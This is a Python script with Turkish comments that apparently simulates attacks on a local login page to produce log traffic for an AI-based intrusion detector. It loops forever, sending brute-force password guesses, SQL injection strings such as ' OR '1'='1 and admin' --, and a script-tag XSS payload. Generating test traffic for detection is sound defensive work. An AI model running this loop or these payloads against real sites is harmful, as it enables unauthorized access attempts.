import requests
import time
import random

# 1. HEDEF AYARLARI
# Giriş ekranının adresi (Görüntüleme için)
LOGIN_PAGE = "http://localhost:8080/frontend/pages/login.php"

# Giriş işleminin yapıldığı arka plan servisi (Loglardan tespit ettiğimiz adres)
# Eğer bu adres çalışmazsa sadece login.php'ye POST atarız.
AUTH_API = "http://localhost:8080/backend/api/auth.php?action=login"

# 2. SALDIRI VERİLERİ
# Yapay zekanın loglarda yakalaması gereken şüpheli kullanıcı adları
KULLANICI_ADLARI = [
    "admin", 
    "administrator", 
    "root", 
    "' OR '1'='1",              # SQL Injection Payloads
    "admin' --",                # SQL Injection (Yorum satırı)
    "<script>alert(1)</script>" # XSS Payloads
]

SIFRELER = ["123456", "password", "admin123", "1234", "' OR '1'='1"]

print(f"⚔️  Gelişmiş Saldırı Simülatörü Başlatıldı")
print(f"🎯 Hedef: {LOGIN_PAGE}")
print("-" * 50)

while True:
    try:
        # SENARYO 1: Masum bir ziyaretçi gibi sayfayı aç (GET)
        # Bu loglarda "200 OK" olarak görünür, gürültü yaratır.
        requests.get(LOGIN_PAGE, timeout=1)
        
        # SENARYO 2: Giriş yapmayı dene (POST - Brute Force & SQLi)
        # Rastgele bir kullanıcı adı ve şifre seç
        u_name = random.choice(KULLANICI_ADLARI)
        pwd = random.choice(SIFRELER)
        
        # Form verisi (Input name'leri genelde 'username' veya 'email' olur)
        # Senin sitendeki formun input name'leri neyse buraya ekleyebiliriz.
        # Genelde: username, email, password, sifre vb.
        payload = {
            'username': u_name,
            'email': u_name,      # Bazı sistemler email ister
            'password': pwd,
            'sifre': pwd
        }

        print(f"💣 Giriş Deneniyor -> Kullanıcı: {u_name} | Şifre: {pwd}")
        
        # Hem login sayfasına hem auth api'ye saldır (Garanti olsun)
        requests.post(LOGIN_PAGE, data=payload, timeout=1)
        requests.post(AUTH_API, data=payload, timeout=1)

    except Exception as e:
        print(f"⚠️ Bağlantı Hatası: {e}")
    
    time.sleep(random.uniform(0.5, 2.0))